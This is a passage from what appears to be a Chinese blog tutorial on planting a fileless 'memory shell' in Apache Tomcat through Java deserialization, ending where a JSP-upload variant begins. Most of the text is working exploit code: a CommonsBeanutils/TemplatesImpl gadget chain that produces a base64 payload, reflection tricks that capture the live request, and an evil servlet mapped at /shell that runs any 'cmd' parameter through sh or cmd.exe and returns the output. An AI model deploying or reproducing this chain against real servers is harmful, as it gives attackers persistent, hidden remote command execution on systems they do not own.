class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFinalStatic(WRAP_SAME_OBJECT_FIELD);</span><br><span class="line">        setFinalStatic(lastServicedRequestField);</span><br><span class="line">        setFinalStatic(lastServicedResponseField);</span><br><span class="line"></span><br><span class="line">        ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line">        ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>) || lastServicedRequest == <span class="literal">null</span> || lastServicedResponse == <span class="literal">null</span>)&#123;</span><br><span class="line">            WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">            lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">            lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            AddMemoryShell(lastServicedRequest, lastServicedResponse);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">AddMemoryShell</span><span class="params">(ThreadLocal&lt;ServletRequest&gt; lastServicedRequest, ThreadLocal&lt;ServletResponse&gt; lastServicedResponse)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> lastServicedRequest.get();</span><br><span class="line">        <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> lastServicedResponse.get();</span><br><span class="line"></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletRequest.getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获得StandardContext后按照分析的步骤做就行了</span></span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">EvilWrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">        <span class="comment">//（重点）此处不利用无参构造方法获得EvilTemplatesImpl对象是避免循环执行无参构造方法中的代码！</span></span><br><span class="line">        <span class="type">Servlet</span> <span class="variable">evilTemplates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilTemplatesImpl</span>(<span class="string">&quot;rainb0w&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> evilTemplates.getClass().getSimpleName();</span><br><span class="line">        EvilWrapper.setName(ClassName);</span><br><span class="line">        EvilWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">        EvilWrapper.setServlet(evilTemplates);</span><br><span class="line">        EvilWrapper.setServletClass(evilTemplates.getClass().getName());</span><br><span class="line"></span><br><span class="line">        standardContext.addChild(EvilWrapper);</span><br><span class="line">        standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>, ClassName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里无法直接new一个Servlet对象，具体原因未知（后续反序列化注入Tomcat-Filter型内存马时同样无法直接创建一个Filter对象）。因此采用办法的是让EvilTemplatesImpl实现Servlet接口，接着重写接口中的方法，将接受参数执行命令并回显的部分写入service方法中，最后我们直接创建一个EvilTemplatesImpl对象即是一个Servlet对象。<strong>但是切记不要使用无参构造方法创建，因为反序列化时我们无参构造方法中的代码是默认执行的，如果这里创建对象时还用无参构造方法，那么就会造成递归。</strong>实际效果如下：</p><p>首先将生成的payload进行url编码发送：</p><p><img src="https://pic.imgdb.cn/item/64d26d701ddac507cc03df1c.jpg" alt="image-20230803115541939"></p><p>接着进入&#x2F;shell即可执行命令：</p><p><img src="https://pic.imgdb.cn/item/64d26d821ddac507cc040f4a.jpg" alt="image-20230803115508565"></p><p>以下是第二种方法的EXP：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(EvilTemplatesImpl1.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.jupiter.api.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> getpayload();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(payload);</span><br><span class="line">        outputStream.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(codes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>恶意模板类如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Wrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTemplatesImpl1</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> ServletConfig config;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig var1)</span> <span class="keyword">throws</span> ServletException&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.config;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Servlet Info&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">        out.println(output);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> HashSet&lt;Object&gt; h;</span><br><span class="line">    <span class="keyword">static</span> HttpServletRequest r;</span><br><span class="line">    <span class="keyword">static</span> HttpServletResponse p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilTemplatesImpl1</span><span class="params">()</span>&#123;</span><br><span class="line">        r = <span class="literal">null</span>;</span><br><span class="line">        p = <span class="literal">null</span>;</span><br><span class="line">        h =<span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">        F(Thread.currentThread(),<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilTemplatesImpl1</span><span class="params">(String s)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">i</span><span class="params">(Object obj)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(obj==<span class="literal">null</span>|| h.contains(obj))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        h.add(obj);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">p</span><span class="params">(Object o, <span class="type">int</span> depth)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(depth &gt; <span class="number">52</span>||(r !=<span class="literal">null</span>&amp;&amp; p !=<span class="literal">null</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!i(o))&#123;</span><br><span class="line">            <span class="keyword">if</span>(r ==<span class="literal">null</span>&amp;&amp;HttpServletRequest.class.isAssignableFrom(o.getClass()))&#123;</span><br><span class="line">                r = (HttpServletRequest)o;</span><br><span class="line">                <span class="keyword">if</span>(r.getHeader(<span class="string">&quot;rainb0w&quot;</span>)==<span class="literal">null</span>) &#123;</span><br><span class="line">                    r = <span class="literal">null</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        p = (HttpServletResponse) r.getClass().getMethod(<span class="string">&quot;getResponse&quot;</span>).invoke(r);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        r = <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(r !=<span class="literal">null</span>&amp;&amp; p !=<span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">                AddMemoryShell(r,p);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            F(o,depth+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">F</span><span class="params">(Object start, <span class="type">int</span> depth)</span>&#123;</span><br><span class="line"></span><br><span class="line">        Class n=start.getClass();</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (Field declaredField : n.getDeclaredFields()) &#123;</span><br><span class="line">                declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    o = declaredField.get(start);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(!o.getClass().isArray())&#123;</span><br><span class="line">                        p(o,depth);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">for</span> (Object q : (Object[]) o) &#123;</span><br><span class="line">                            p(q, depth);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">while</span>(</span><br><span class="line">                (n = n.getSuperclass())!=<span class="literal">null</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">AddMemoryShell</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">EvilWrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">            <span class="comment">//(重要！)此处不利用无参构造方法获得EvilTemplatesImpl对象是避免循环执行无参构造方法中的代码！</span></span><br><span class="line">            <span class="type">Servlet</span> <span class="variable">evilServlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilTemplatesImpl1</span>(<span class="string">&quot;rainb0w&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> evilServlet.getClass().getSimpleName();</span><br><span class="line">            EvilWrapper.setName(ClassName);</span><br><span class="line">            EvilWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">            EvilWrapper.setServlet(evilServlet);</span><br><span class="line">            EvilWrapper.setServletClass(evilServlet.getClass().getName());</span><br><span class="line"></span><br><span class="line">            standardContext.addChild(EvilWrapper);</span><br><span class="line">            standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>, ClassName);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读代码，可以看到我们这里判断是否获取到了当前请求的request对象时，是通过判断当前请求是否存在rainb0w请求头来进行的。如果能够获取到当前请求的request对象，那么就通过反射获取到当前请求的response对象。接着传入到AddMemoryShell方法用于获取StandardContext。因此我们在传入生成的payload的时候就需要发送rainb0w请求头：</p><p><img src="https://pic.imgdb.cn/item/64d26d921ddac507cc043fe8.jpg" alt="image-20230803121203786"></p><p>因为通过这种方法获取request对象不稳定，因此可能需要传入多次payload。</p><h4 id="上传jsp注入Tomcat-Servlet内存马"><a href="#上传jsp注入Tomcat-Servlet内存马" class="headerlink" title="上传jsp注入Tomcat-Servlet内存马"></a>上传jsp注入Tomcat-Servlet内存马</h4><p>相比反序列化传入字节码注入内存马相比，上传jsp的方法则要简单的多，因此jsp中内置request对象，我们可以直接用内置的request对象反射获得StandardContext：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 